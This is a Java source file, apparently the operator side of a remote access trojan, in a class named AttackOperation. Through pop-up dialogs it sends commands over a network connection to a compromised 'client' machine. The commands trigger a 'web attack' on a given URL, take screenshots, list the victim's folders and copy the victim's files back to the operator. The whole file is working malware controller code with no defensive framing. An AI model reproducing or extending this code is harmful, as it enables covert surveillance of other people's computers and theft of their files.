import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileOutputStream;

import javax.swing.JFrame;
import javax.swing.JOptionPane;

public class AttackOperation {
	static String send="",recive="";
	
	public static void webAttack(JFrame j,DataInputStream din,DataOutputStream dout)throws Exception{
		String str = "Enter the web url :";
		send = JOptionPane.showInputDialog(j,str);;
		dout.writeUTF(send);
		recive = din.readUTF();
		JOptionPane.showMessageDialog(j, recive);		
	}
	
	
	public static String screenshot(JFrame j){
		
		String str = "Enter the path to store the screenshot :\nExample = D:\\Shot.jpg";
		send = JOptionPane.showInputDialog(j,str);;
		return "path`"+send; 
		
		
	}
	
	public static String fileExplore(JFrame j){
		
		String str = "Enter the command to explore :\nCommands:\ndir <path> = show the items in the folder\n\nExample: dir C:\\";
		send = JOptionPane.showInputDialog(j,str);;
		return "dir`"+send; 
		
		
	}
	
	public static void fileDownload(JFrame f,DataInputStream din,DataOutputStream dout){
		
		try{
			String Clientpath = JOptionPane.showInputDialog(f,"Enter the path of the file in client:\nExamples:\n1.D:\\\test.png\n2.D:\\\test.ppt\n3.D:\\test.mp4\n\nmention the extention of the file");
			dout.writeUTF("download`"+Clientpath);
			String serverPath = JOptionPane.showInputDialog(f,"Enter the path to download:\nExamples:\n1.D:\\\test.png\n2.D:\\\test.ppt\n3.D:\\test.mp4\n\nmention the extention of the file\nyou can see the file in your system after the completion of download");
			
			FileOutputStream fout = new FileOutputStream(serverPath);
			
			int i;
	        while ( (i = din.read()) > -1) {
	        	fout.write(i);
	        }
	        
			JOptionPane.showMessageDialog(f, "file downloaded successfully");
		}
		catch(Exception e){
			JOptionPane.showMessageDialog(f, "download failed ..");			
		}
		
		
	}
	
	
}
